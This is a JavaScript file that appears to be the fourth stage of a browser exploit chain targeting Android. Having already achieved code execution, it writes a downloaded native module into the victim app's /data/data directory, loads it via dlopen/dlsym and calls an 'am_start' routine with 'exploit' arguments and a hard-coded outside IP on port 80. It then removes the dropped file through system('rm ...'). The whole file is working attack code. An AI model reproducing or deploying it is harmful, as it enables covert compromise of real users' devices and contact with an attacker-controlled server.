var ENABLE_DEBUG = true
void 0 === window.INFO && (INFO = function (a) {console.log(a)})
void 0 === window.ERR && (ERR = function () {
  window.location.replace('error.php')
  throw Error()
})

function finish () {
  //window.location.replace('about:blank')
}

function stage4 (a, g, d, q, c) {
  function r () {
    null === window.g_module && ERR('Module download failed!')
    var b = '/data/data/' + s, c = b + '/module.so';
    (function (c, d) {
      a.writestring(e, c)
      a.writestring(n, 'wb')
      k = g.call(t, e, n)
      0 === k && ERR('cannot open file for writing: ' + c)
      for (var b = d.byteLength, h = 0, l = 0; 0 < b;) {
        if (4 > b) {
          for (var l = b, f = 0; f < b; f++) {
            a.write8(m + f, d.getUint8(h + f))
          }
        } else {
          for (f = 0; f < Math.min(64, b / 4); f++) {
            a.write32(m + 4 * f, d.getUint32(h + 4 * f, !0))
          }
          l = 4 * Math.min(64, b / 4)
        }
        f = g.call(w, m, 1, l, k)
        f != l && ERR('Failed to write file: write for ' +
          l + ' issued, got ' + f)
        h += l
        b -= l
      }
      g.call(u, k)
    })(c, window.g_module)
    var p = d.findreloc('dlsym'), h = d.findreloc('dlopen')
    d.findreloc('dlclose')
    a.writestring(e, c)
    h = g.call(h, e, 0)
    a.writestring(e, 'am_start')
    p = g.call(p, h, e)
    a.writestring(e, b)
    b = e + 256
    a.writestring(b + 0, key)
    a.writestring(b + 256, '/root')
    a.writestring(b + 512, agent)
    a.writestring(b + 768, 'exploit')
    a.writestring(b + 1024, flags)
    a.writestring(b + 1280, '47.75.14.109')
    h = parseInt('80')
    g.forkingcall(p,
      e, h, b)
    a.writestring(e, 'rm ' + c)
    g.call(x, e)
    finish()
  }

  ENABLE_DEBUG && INFO('> [ Stage 4 ]')
  var x = d.requiresymbol('system'), t = d.requiresymbol('fopen')
  d.requiresymbol('fread')
  var y = d.requiresymbol('fgets'), w = d.requiresymbol('fwrite'), u = d.requiresymbol('fclose')
  q = d.requiresymbol('getpid')
  var e = c + 53248
  a.writestring(e, '/proc/self/cmdline')
  var n = c + 53504
  a.writestring(n, 'r')
  var m = c + 53760, k = g.call(t, e, n)
  0 === k && ERR('Can\'t open file')
  c = g.call(y, m, 256, k)
  c != m && ERR('fgets() failed: ' + c)
  var s = a.readstring(m)
  g.call(u, k)
  c = g.call(q)
  ENABLE_DEBUG && INFO('Got RCE for ' + s + ' (PID: ' + c + ')')
  if (void 0 !== window.g_module) {
    r()
  } else {
    var v
    v = window.setInterval(function () {void 0 !== window.g_module && (r(), window.clearInterval(v))}, 100)
  }
};

